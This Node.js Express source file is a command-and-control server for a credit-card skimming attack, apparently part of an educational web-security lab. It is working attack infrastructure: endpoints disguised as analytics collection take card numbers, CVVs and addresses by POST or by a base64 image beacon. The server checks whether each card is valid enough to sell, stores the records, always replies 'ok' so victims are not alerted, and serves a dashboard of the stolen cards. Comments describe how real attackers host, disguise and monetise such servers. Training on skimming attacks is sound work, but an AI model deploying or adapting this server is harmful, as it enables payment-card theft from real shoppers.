/**
 * ATTACKER'S C2 (COMMAND & CONTROL) SERVER
 *
 * This simulates the server that receives stolen credit card data
 * In real attacks, this would be hosted on:
 * - Compromised legitimate servers
 * - Bulletproof hosting providers
 * - Domains that mimic legitimate services
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

const express = require('express')
const fs = require('fs').promises
const path = require('path')
const cors = require('cors')

const app = express()
// Use PORT environment variable (Cloud Run requires 8080) or default to 3000 for local
const PORT = process.env.PORT || 3000
const DATA_DIR = path.join(__dirname, 'stolen-data')

// Middleware
app.use(cors()) // Allow cross-origin requests (for demo only)
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

// Ensure data directory exists
async function ensureDataDir() {
  try {
    await fs.mkdir(DATA_DIR, { recursive: true })
    console.log('[C2] Data directory ready:', DATA_DIR)
  } catch (error) {
    console.error('[C2] Failed to create data directory:', error)
  }
}

/**
 * Log stolen data to file
 * Real attackers would:
 * - Store in database
 * - Encrypt before storage
 * - Immediately forward to drop servers
 * - Delete logs regularly to avoid evidence
 */
async function logStolenData(data) {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
  const filename = `stolen_${timestamp}.json`
  const filepath = path.join(DATA_DIR, filename)

  try {
    await fs.writeFile(filepath, JSON.stringify(data, null, 2), 'utf8')

    console.log('[C2] ✅ Stolen data logged:', filename)
    console.log('[C2] Card:', maskCardNumber(data.cardNumber))

    return filename
  } catch (error) {
    console.error('[C2] ❌ Failed to log data:', error)
    throw error
  }
}

/**
 * Append to master log file for easy analysis
 */
async function appendToMasterLog(data) {
  const logPath = path.join(DATA_DIR, 'master-log.jsonl')
  const logEntry =
    JSON.stringify({
      timestamp: new Date().toISOString(),
      ...data
    }) + '\n'

  try {
    await fs.appendFile(logPath, logEntry, 'utf8')
  } catch (error) {
    console.error('[C2] Failed to append to master log:', error)
  }
}

/**
 * Mask card number for logging (show first 6 and last 4)
 * This is how attackers verify they're getting valid data
 */
function maskCardNumber(cardNumber) {
  if (!cardNumber) return 'N/A'
  const clean = cardNumber.replace(/[\s-]/g, '')
  if (clean.length < 10) return '****'

  return clean.slice(0, 6) + '******' + clean.slice(-4)
}

/**
 * Validate stolen card data
 * Attackers check if data is worth selling
 */
function validateCardData(data) {
  const issues = []

  if (!data.cardNumber) {
    issues.push('Missing card number')
  } else {
    const clean = data.cardNumber.replace(/[\s-]/g, '')
    if (clean.length !== 15 && clean.length !== 16) {
      issues.push('Invalid card number length')
    }
  }

  if (!data.cvv || (data.cvv.length !== 3 && data.cvv.length !== 4)) {
    issues.push('Invalid or missing CVV')
  }

  if (!data.expiry) {
    issues.push('Missing expiry date')
  }

  return {
    valid: issues.length === 0,
    issues: issues
  }
}

/**
 * Main endpoint - receives stolen credit card data
 * Real C2 endpoints are often disguised as:
 * - /collect (analytics)
 * - /track (tracking pixel)
 * - /beacon (monitoring)
 * - /pixel.gif (image beacon)
 */
app.post('/collect', async (req, res) => {
  const clientIP = req.ip || req.connection.remoteAddress

  console.log('\n[C2] 🎯 Incoming POST request from:', clientIP)
  console.log('[C2] User-Agent:', req.get('user-agent'))
  console.log('[C2] Content-Type:', req.get('content-type'))
  console.log('[C2] Content-Length:', req.get('content-length'))
  console.log('[C2] Request headers:', JSON.stringify(req.headers, null, 2))
  console.log('[C2] Raw request body:', JSON.stringify(req.body, null, 2))
  console.log('[C2] Request body type:', typeof req.body)
  console.log('[C2] Request body keys:', Object.keys(req.body || {}))

  try {
    const stolenData = req.body

    // Add server-side metadata
    stolenData.server = {
      receivedAt: new Date().toISOString(),
      clientIP: clientIP,
      userAgent: req.get('user-agent')
    }

    // Validate the data
    const validation = validateCardData(stolenData)
    stolenData.validation = validation

    if (validation.valid) {
      console.log('[C2] ✅ VALID CARD DATA RECEIVED')
    } else {
      console.log('[C2] ⚠️  INCOMPLETE DATA:', validation.issues.join(', '))
    }

    // Log to individual file
    const filename = await logStolenData(stolenData)

    // Append to master log
    await appendToMasterLog(stolenData)

    // Send success response (real attackers send minimal response)
    res.status(200).json({
      status: 'ok',
      id: filename.replace('.json', '')
    })
  } catch (error) {
    console.error('[C2] Error processing stolen data:', error)

    // Still respond with success to avoid alerting the victim
    res.status(200).json({ status: 'ok' })
  }
})

/**
 * Image beacon endpoint (fallback exfiltration method)
 * Data is sent as base64-encoded query parameter
 */
app.get('/collect', async (req, res) => {
  console.log('\n[C2] 🎯 Image beacon exfiltration detected')

  try {
    if (req.query.d) {
      // Decode base64 data
      const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')

      // Security: Parse JSON and sanitize to prevent prototype pollution
      const stolenData = JSON.parse(decoded)

      // Remove dangerous prototype properties if present
      if (stolenData && typeof stolenData === 'object') {
        delete stolenData.__proto__
        delete stolenData.constructor
        // Create a clean object without prototype pollution
        const cleanData = JSON.parse(JSON.stringify(stolenData))
        Object.setPrototypeOf(cleanData, Object.prototype)

        cleanData.server = {
          receivedAt: new Date().toISOString(),
          clientIP: req.ip,
          method: 'image-beacon'
        }

        await logStolenData(cleanData)
        await appendToMasterLog(cleanData)
      }
    }
  } catch (error) {
    console.error('[C2] Failed to process image beacon:', error)
  }

  // Return a 1x1 transparent GIF
  const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')

  res.writeHead(200, {
    'Content-Type': 'image/gif',
    'Content-Length': gif.length
  })
  res.end(gif)
})

/**
 * API endpoint - return stolen data as JSON
 */
app.get('/api/stolen', async (req, res) => {
  try {
    const files = await fs.readdir(DATA_DIR)
    const jsonFiles = files.filter(f => f.endsWith('.json') && f !== 'master-log.jsonl')

    const stolenRecords = []

    for (const file of jsonFiles) {
      const content = await fs.readFile(path.join(DATA_DIR, file), 'utf8')
      stolenRecords.push(JSON.parse(content))
    }

    // Sort by timestamp (newest first)
    stolenRecords.sort((a, b) => {
      const timeA = a.metadata?.timestamp || a.server?.receivedAt || ''
      const timeB = b.metadata?.timestamp || b.server?.receivedAt || ''
      return timeB.localeCompare(timeA)
    })

    res.json(stolenRecords)
  } catch (error) {
    console.error('[C2] Error reading stolen data:', error)
    res.status(500).json({ error: 'Error loading stolen data' })
  }
})

/**
 * Dashboard endpoint - view stolen data
 * Real attackers would have password-protected admin panels
 * Serves the dashboard.html file which has navigation buttons
 */
app.get('/stolen', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = await fs.readFile(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[C2] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

/**
 * Generate HTML dashboard showing stolen cards
 */
function generateDashboard(records) {
  const recordsHtml = records
    .map((record, index) => {
      const validation = record.validation || { valid: false, issues: [] }
      const validBadge = validation.valid
        ? '<span style="color: green;">✅ VALID</span>'
        : '<span style="color: orange;">⚠️ INCOMPLETE</span>'

      return `
            <div style="border: 1px solid #0f0; padding: 15px; margin: 10px 0; border-radius: 5px; background: ${validation.valid ? '#2a4a2a' : '#4a3a2a'}; color: #0f0;">
                <h3>Record #${index + 1} ${validBadge}</h3>
                <p><strong>Timestamp:</strong> ${record.metadata?.timestamp || record.server?.receivedAt || 'Unknown'}</p>
                <p><strong>Card Number:</strong> ${maskCardNumber(record.cardNumber)}</p>
                <p><strong>CVV:</strong> ${record.cvv ? '***' : 'N/A'}</p>
                <p><strong>Expiry:</strong> ${record.expiry || 'N/A'}</p>
                <p><strong>Cardholder:</strong> ${record.cardholderName || 'N/A'}</p>
                <p><strong>Email:</strong> ${record.email || 'N/A'}</p>
                <p><strong>Billing Address:</strong> ${record.billingAddress || 'N/A'}</p>
                <p><strong>City/ZIP:</strong> ${record.city || ''} ${record.zip || ''}</p>
                <p><strong>Client IP:</strong> ${record.server?.clientIP || 'Unknown'}</p>
                ${!validation.valid ? `<p><strong>Issues:</strong> ${validation.issues.join(', ')}</p>` : ''}
            </div>
        `
    })
    .join('')

  return `
        <!DOCTYPE html>
        <html>
        <head>
            <title>C2 Dashboard - Stolen Credit Cards</title>
            <meta charset="utf-8">
            <style>
                body {
                    font-family: 'Courier New', monospace;
                    max-width: 1000px;
                    margin: 0 auto;
                    padding: 20px;
                    background: #1a1a1a;
                    color: #0f0;
                }
                h1 {
                    color: #0f0;
                    text-align: center;
                    border-bottom: 2px solid #0f0;
                    padding-bottom: 10px;
                }
                .stats {
                    background: #2a2a2a;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                    border: 1px solid #0f0;
                }
                .warning {
                    background: #ff0000;
                    color: white;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                    text-align: center;
                    font-weight: bold;
                }
            </style>
        </head>
        <body>
            <h1>⚠️ ATTACKER C2 DASHBOARD ⚠️</h1>

            <div class="warning">
                🚨 EDUCATIONAL DEMONSTRATION ONLY 🚨<br>
                This simulates an attacker's data collection server
            </div>

            <div class="stats">
                <h2>Statistics</h2>
                <p><strong>Total Records:</strong> ${records.length}</p>
                <p><strong>Valid Cards:</strong> ${records.filter(r => r.validation?.valid).length}</p>
                <p><strong>Incomplete Records:</strong> ${records.filter(r => !r.validation?.valid).length}</p>
            </div>

            <h2>Stolen Credit Card Data</h2>
            ${records.length === 0 ? '<p>No data collected yet. Visit the vulnerable site and complete checkout.</p>' : recordsHtml}

            <div style="margin-top: 40px; padding: 20px; border-top: 1px solid #0f0;">
                <p><strong>In real attacks, this data would be:</strong></p>
                <ul>
                    <li>Sold on dark web marketplaces ($5-30 per card)</li>
                    <li>Used for fraudulent purchases</li>
                    <li>Aggregated with other stolen data</li>
                    <li>Forwarded to money mules</li>
                </ul>
            </div>
        </body>
        </html>
    `
}

/**
 * Dashboard endpoint - serves the main dashboard
 * Note: In production, this is accessed via /stolen or /dashboard
 * The root / is handled by nginx to serve the vulnerable site
 */
app.get('/dashboard', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = await fs.readFile(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[C2] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

/**
 * Root endpoint - serve dashboard directly
 * Note: Traefik strips /lab1/c2 prefix, so / becomes / at the C2 server
 * We serve the dashboard directly instead of redirecting to preserve the path
 */
app.get('/', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = await fs.readFile(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[C2] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

/**
 * Health check endpoint
 */
app.get('/health', (req, res) => {
  res.json({ status: 'operational', timestamp: new Date().toISOString() })
})

/**
 * Statistics endpoint (JSON)
 */
app.get('/stats', async (req, res) => {
  try {
    const files = await fs.readdir(DATA_DIR)
    const jsonFiles = files.filter(f => f.endsWith('.json'))

    res.json({
      totalRecords: jsonFiles.length,
      dataDirectory: DATA_DIR
    })
  } catch (error) {
    res.status(500).json({ error: 'Failed to read statistics' })
  }
})

// Start server
async function start() {
  await ensureDataDir()

  app.listen(PORT, '0.0.0.0', () => {
    console.log('═══════════════════════════════════════════════════')
    console.log('🚨 ATTACKER C2 SERVER OPERATIONAL 🚨')
    console.log('═══════════════════════════════════════════════════')
    console.log(`Port: ${PORT}`)
    console.log(`Dashboard: http://localhost:${PORT}/stolen`)
    console.log(`Listening on: 0.0.0.0:${PORT}`)
    console.log(`Data Directory: ${DATA_DIR}`)
    console.log('═══════════════════════════════════════════════════')
    console.log('⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️')
    console.log('═══════════════════════════════════════════════════\n')
    console.log('Waiting for stolen data...\n')
  })
}

start()
